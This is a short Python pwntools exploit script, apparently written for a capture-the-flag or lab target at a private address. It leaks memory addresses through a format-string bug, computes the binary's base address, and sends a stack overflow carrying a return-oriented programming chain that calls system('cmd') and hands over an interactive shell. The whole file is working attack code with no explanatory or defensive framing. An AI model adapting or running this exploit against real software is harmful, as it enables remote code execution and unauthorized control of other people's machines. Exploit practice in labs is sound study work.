from pwn import *


def leek():
    conn.sendline('1')
    conn.sendline('%p %p')
    conn.recvuntil('You say : ')
    adr = conn.recvline()
    adr = adr.split(' ')
    adr = [int(i, 16) for i in adr]
    return adr


def buf(str):
    conn.sendline('2')
    conn.sendline(str)


conn = remote('192.168.198.1', 4444)
adrList = leek()
base = adrList[0] - 0x14001E098

cmd_adr = adrList[1] + 0x1ca0
command = 'cmd\x00'
system_adr = base + 0x140004628
pop_rdi_ret = base + 0x140001519
pop_rsi_ret = base + 0x140001d45
mov_rcx_rdi_call_rsi = base + 0x140002648

bufStr = command
bufStr += 'A' * (32 - len(command))
bufStr += p64(pop_rdi_ret)
bufStr += p64(cmd_adr)
bufStr += p64(pop_rsi_ret)
bufStr += p64(system_adr)
bufStr += p64(mov_rcx_rdi_call_rsi)
buf(bufStr)

conn.interactive()
